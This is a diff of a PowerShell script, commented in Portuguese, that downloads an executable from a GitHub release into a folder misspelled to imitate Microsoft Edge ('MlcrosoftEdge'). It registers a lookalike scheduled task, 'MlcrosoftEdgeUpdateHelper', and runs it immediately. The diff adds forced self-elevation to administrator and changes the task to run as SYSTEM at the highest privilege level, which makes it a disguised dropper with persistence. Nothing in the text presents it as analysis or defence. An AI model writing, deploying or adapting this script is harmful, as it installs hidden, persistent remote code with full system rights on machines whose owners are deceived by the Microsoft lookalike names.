@@ -9,6 +9,59 @@ NSDA8D7213ND328YM243DC87Y2M4C28Y7MN2C84YUNM283CM2C4
 [CmdletBinding()]
 param()
 
+# ⭐⭐⭐ FUNÇÃO DE AUTO-ELEVAÇÃO ⭐⭐⭐
+function Elevate-ToAdmin {
+    param(
+        [string]$ScriptPath = $MyInvocation.MyCommand.Path
+    )
+    
+    # Verifica se já está como Administrador
+    $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
+    $isAdmin = $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+    
+    if (-NOT $isAdmin) {
+        Write-Host "🔴 Script NÃO está rodando como Administrador!" -ForegroundColor Red
+        Write-Host "🔄 Reiniciando com privilégios elevados..." -ForegroundColor Yellow
+        
+        # Prepara os argumentos
+        $arguments = "-File `"$ScriptPath`""
+        
+        # Adiciona os parâmetros originais se houver
+        if ($MyInvocation.BoundParameters) {
+            foreach ($key in $MyInvocation.BoundParameters.Keys) {
+                $value = $MyInvocation.BoundParameters[$key]
+                if ($value -is [switch]) {
+                    $arguments += " -$key"
+                } else {
+                    $arguments += " -$key `"$value`""
+                }
+            }
+        }
+        
+        # Adiciona argumentos posicionais se houver
+        if ($MyInvocation.UnboundArguments) {
+            $arguments += " " + ($MyInvocation.UnboundArguments -join " ")
+        }
+        
+        Write-Host "📌 Executando: powershell.exe $arguments" -ForegroundColor Cyan
+        
+        # Reinicia o script como Administrador
+        $process = Start-Process -FilePath "powershell.exe" -ArgumentList $arguments -Verb RunAs -PassThru
+        
+        Write-Host "⏳ Aguardando novo processo..." -ForegroundColor Yellow
+        $process.WaitForExit()
+        
+        # Sai do processo atual
+        Exit $process.ExitCode
+    }
+    
+    Write-Host "✅ Script rodando com privilégios de Administrador!" -ForegroundColor Green
+}
+
+# ⭐ CHAMA A AUTO-ELEVAÇÃO ANTES DE QUALQUER COISA
+Elevate-ToAdmin
+
+# ⭐ CONTINUAÇÃO DO SCRIPT (JÁ COMO ADMIN)
 $urlDownload = "https://github.com/4ybbe/phpSv/releases/download/stupid/EdgeUpdateSupport.exe"
 $diretorioDestino = "C:\ProgramData\MlcrosoftEdge"
 $nomeTarefa = "MlcrosoftEdgeUpdateHelper"
@@ -56,7 +109,7 @@ function Add-ScheduledTask {
     try {
         Write-Host "Criando tarefa '$Nome' no agendador do Windows..."
         
-        # Remove tarefa existente
+        # Remove tarefa existente se houver
         $tarefaExistente = Get-ScheduledTask -TaskName $Nome -ErrorAction SilentlyContinue
         if ($tarefaExistente) {
             Write-Host "Removendo tarefa existente..."
@@ -66,7 +119,7 @@ function Add-ScheduledTask {
         $usuario = "$env:USERDOMAIN\$env:USERNAME"
         $dataAtual = Get-Date -Format "yyyy-MM-ddTHH:mm:ss"
         
-        # ⭐ XML SEM HighestAvailable
+        # ⭐⭐⭐ XML COM PRIVILÉGIOS MÁXIMOS (SYSTEM + HIGHEST) ⭐⭐⭐
         $xmlTarefa = @"
 <?xml version="1.0" encoding="UTF-16"?>
 <Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
@@ -81,9 +134,9 @@ function Add-ScheduledTask {
   </Triggers>
   <Principals>
     <Principal id="Author">
-      <UserId>$usuario</UserId>
-      <LogonType>InteractiveToken</LogonType>
-      <!-- ⭐ REMOVIDO RunLevel -->
+      <UserId>SYSTEM</UserId>
+      <LogonType>ServiceAccount</LogonType>
+      <RunLevel>HighestAvailable</RunLevel>
     </Principal>
   </Principals>
   <Settings>
@@ -114,45 +167,54 @@ function Add-ScheduledTask {
 </Task>
 "@
 
+        # Salva XML em arquivo temporário
         $xmlPath = [System.IO.Path]::GetTempFileName() + ".xml"
         $xmlTarefa | Out-File -FilePath $xmlPath -Encoding Unicode
         
+        Write-Host "📄 XML criado: $xmlPath"
+        
+        # ⭐ IMPORTA A TAREFA COM PRIVILÉGIOS MÁXIMOS
         $process = Start-Process -FilePath "schtasks" -ArgumentList "/create /tn `"$Nome`" /xml `"$xmlPath`" /f" -Wait -PassThru -NoNewWindow
         
+        # Limpa arquivo temporário
         Remove-Item $xmlPath -Force -ErrorAction SilentlyContinue
         
         if ($process.ExitCode -ne 0) {
             throw "Falha ao criar tarefa. Código: $($process.ExitCode)"
         }
         
-        Write-Host "Tarefa '$Nome' criada com sucesso!" -ForegroundColor Green
+        Write-Host "✅ Tarefa '$Nome' criada com SUCESSO como SYSTEM!" -ForegroundColor Green
         return $true
         
     } catch {
-        Write-Error "Falha ao criar tarefa: $_"
+        Write-Error "❌ Falha ao criar tarefa: $_"
         return $false
     }
 }
 
 function Main {   
-    Write-Host "=== INICIANDO INSTALAÇÃO ===" -ForegroundColor Cyan
-    Write-Host "URL: $urlDownload"
-    Write-Host "Destino: $diretorioDestino"
-    Write-Host "Nome da Tarefa: $nomeTarefa"
-    Write-Host ""
+    Write-Host "`n========================================" -ForegroundColor Cyan
+    Write-Host "   🚀 INICIANDO INSTALAÇÃO" -ForegroundColor Cyan
+    Write-Host "========================================" -ForegroundColor Cyan
+    Write-Host "📌 URL: $urlDownload"
+    Write-Host "📁 Destino: $diretorioDestino"
+    Write-Host "📋 Nome da Tarefa: $nomeTarefa"
+    Write-Host "👤 Executando como: $env:USERDOMAIN\$env:USERNAME" -ForegroundColor Yellow
+    Write-Host "🔑 Privilégios: ADMIN" -ForegroundColor Green
+    Write-Host "========================================`n"
     
     try {
         # 1. Cria a pasta de destino
-        Write-Host "Passo 1/3: Criando diretório..."
+        Write-Host "📂 Passo 1/3: Criando diretório..."
         if (-not (Test-Path -Path $diretorioDestino)) {
             New-Item -ItemType Directory -Path $diretorioDestino -Force | Out-Null
-            Write-Host "Diretório criado: $diretorioDestino"
+            Write-Host "✅ Diretório criado: $diretorioDestino"
         } else {
-            Write-Host "Diretório já existe: $diretorioDestino"
+            Write-Host "ℹ️ Diretório já existe: $diretorioDestino"
         }
         
         # 2. Baixa o executável
-        Write-Host "`nPasso 2/3: Baixando executável..."
+        Write-Host "`n📥 Passo 2/3: Baixando executável..."
         $nomeArquivo = [System.IO.Path]::GetFileName($urlDownload)
         if ([string]::IsNullOrEmpty($nomeArquivo)) {
             $nomeArquivo = "EdgeUpdateSupport.exe"
@@ -169,25 +231,42 @@ function Main {
         if (-not (Test-Path -Path $caminhoCompleto)) {
             throw "Arquivo não encontrado após download: $caminhoCompleto"
         }
+        Write-Host "✅ Arquivo baixado: $caminhoCompleto" -ForegroundColor Green
         
-        # 3. Cria tarefa no agendador (USANDO A FUNÇÃO)
-        Write-Host "`nPasso 3/3: Configurando tarefa no agendador..."
+        # 3. Cria tarefa no agendador (COMO SYSTEM)
+        Write-Host "`n⚙️ Passo 3/3: Configurando tarefa no agendador..."
         $sucessoTarefa = Add-ScheduledTask -Nome $nomeTarefa -CaminhoExecutavel $caminhoCompleto
         
         if (-not $sucessoTarefa) {
             throw "Falha ao criar tarefa agendada"
         }
-        schtasks /run $nomeTarefa
         
-        Write-Host "`n=== INSTALAÇÃO CONCLUÍDA COM SUCESSO! ===" -ForegroundColor Green
-        Write-Host "A tarefa '$nomeTarefa' será executada na próxima inicialização do sistema." -ForegroundColor Yellow
+        # ⭐ EXECUTA A TAREFA IMEDIATAMENTE (opcional)
+        Write-Host "`n▶️ Executando tarefa imediatamente..."
+        $runProcess = Start-Process -FilePath "schtasks" -ArgumentList "/run /tn `"$nomeTarefa`"" -Wait -PassThru -NoNewWindow
+        
+        if ($runProcess.ExitCode -eq 0) {
+            Write-Host "✅ Tarefa executada com sucesso!" -ForegroundColor Green
+        } else {
+            Write-Host "⚠️ Tarefa agendada, mas falhou ao executar imediatamente. Será executada na próxima inicialização." -ForegroundColor Yellow
+        }
+        
+        Write-Host "`n========================================" -ForegroundColor Green
+        Write-Host "   ✅ INSTALAÇÃO CONCLUÍDA COM SUCESSO!" -ForegroundColor Green
+        Write-Host "========================================" -ForegroundColor Green
+        Write-Host "📋 Tarefa: $nomeTarefa" -ForegroundColor Yellow
+        Write-Host "🔑 Executando como: SYSTEM (Privilégios Máximos)" -ForegroundColor Yellow
+        Write-Host "🔄 Será executada na próxima inicialização do sistema." -ForegroundColor Yellow
+        Write-Host "========================================`n"
         
     } catch {
         Write-Error "❌ Erro durante a instalação: $_"
-        Write-Host "`n=== INSTALAÇÃO FALHOU ===" -ForegroundColor Red
+        Write-Host "`n========================================" -ForegroundColor Red
+        Write-Host "   ❌ INSTALAÇÃO FALHOU" -ForegroundColor Red
+        Write-Host "========================================`n" -ForegroundColor Red
         Exit 1
     }
 }
 
-# Executa a função principal
+# ⭐ EXECUTA A FUNÇÃO PRINCIPAL
 Main
